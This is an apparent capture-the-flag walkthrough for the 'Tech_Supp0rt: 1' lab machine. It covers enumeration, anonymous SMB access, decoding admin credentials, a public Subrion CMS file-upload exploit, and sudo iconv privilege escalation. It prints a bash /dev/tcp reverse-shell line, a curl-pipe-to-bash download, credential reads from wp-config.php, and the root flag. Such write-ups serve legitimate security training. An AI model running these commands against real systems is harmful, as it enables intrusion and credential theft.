# Tech_Supp0rt: 1

Nmap scan 

```abap
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

first we enumerate the web server with `dirsearch`

```abap
[20:24:46] 200 -   24KB - /phpinfo.php
[20:25:06] 301 -  303B  - /test  ->  http://tech.thm/test/
[20:25:06] 200 -    4KB - /test/
[20:25:18] 200 -    2KB - /wordpress/wp-login.php
[20:25:18] 404 -   26KB - /wordpress/

```

Going to `test` we see a virus page of Microsoft so thats nothing. But going into `wordpress/index.php/index.php/home/` we get login page for the `BestTech` page and its powered by wordpress. which means we can do a `wpscan` . There is also a wordpress login page that we can enumerate as well.

```abap
wpscan --url http://tech.thm/wordpress/index.php/index.php/home/
```

This doesn't bring back much but lets keep enumerating. Pivoting for a bit we see that a smb ports are open 

```abap
smbclient -L //tech.thm/

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
```

This means we I can connect to the `websvr` anonymously 

```abap
smbclient //tech.thm/websvr -N

root@ip-10-201-39-60:~# smbclient //tech.thm/websvr -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 08:17:38 2021
  ..                                  D        0  Sat May 29 08:03:47 2021
  enter.txt                           N      273  Sat May 29 08:17:38 2021
```

We get the text and then open it up.

```abap
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

We have a admin user name and password but its encoded so decode it with `cyberchef` 

<img width="1856" height="971" alt="Screenshot From 2025-09-09 15-43-13" src="https://github.com/user-attachments/assets/8ba82f42-0e21-48de-b113-25ec5a2a1978" />

Now lets go to the login page and sign in with `admin:Scam2021` But in order to do that we have to find `subrion` . Running a curl we can confirm it exists but its somewhere

```abap
root@ip-10-201-39-60:~# curl -I http://tech.thm/subrion
HTTP/1.1 301 Moved Permanently
Date: Tue, 09 Sep 2025 19:47:51 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://tech.thm/subrion/
Content-Type: text/html; charset=iso-8859-1
```

Enumerating a bit we find `http://tech.thm/subrion/panel/` so lets login in


<img width="1856" height="971" alt="Screenshot From 2025-09-09 15-51-45" src="https://github.com/user-attachments/assets/71449c9c-033e-4138-b966-6201ddb878d0" />

I notice that its running on `Subrion CMS v 4.2.1`

So I found this exploit online https://www.exploit-db.com/exploits/49876 So we can go to the metasploit for ease. 

```abap
msf6 > searchsploit -m php/webapps/49876.py
[*] exec: searchsploit -m php/webapps/49876.py

  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/49876
     Path: /opt/exploitdb/exploits/php/webapps/49876.py
    Codes: CVE-2018-19422
 Verified: False
File Type: Python script, ASCII text executable, with very long lines
Copied to: /root/49876.py
```

```abap
python3 49876.py -u http://tech.thm/subrion/panel/ -l admin -p Scam2021
```

Now we have a shell! Since its not a stable one we can fix that in order to stabilize it

```abap
<MACHINE>
echo 'bash -i >& /dev/tcp/10.201.39.60/9000 0>&1' > reverse.sh
```

```abap
<MACHINE>
python3 -m http.server
```

```abap
<ATTACK>
curl 10.201.39.60:8000/reverse.sh | bash
```

<img width="1856" height="971" alt="Screenshot From 2025-09-09 16-28-36" src="https://github.com/user-attachments/assets/3c0c16e2-6f0a-43ec-b013-44a9309a3344" />

Now since there is a wordpress running we can look at the `wp-config.php` for credentials

```abap
cat /var/www/html/wordpress/wp-config.php

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

Now we have a password and when looking around we found two users `root` and `scamsite` . I tried to switch to user `scamsite` with that password and it works. Then I am in. Now lets run `sudo -l`

```abap
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

https://gtfobins.github.io/gtfobins/iconv/#sudo

```abap
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

LFILE=file_to_read
./iconv -f 8859_1 -t 8859_1 "$LFILE"
```

```abap
scamsite@TechSupport:~$ LFILE=/root/root.txt
scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
851b8233a8c09400ec30651bd1529bf1ed02790b 
```

Flag 

> 851b8233a8c09400ec30651bd1529bf1ed02790b
>
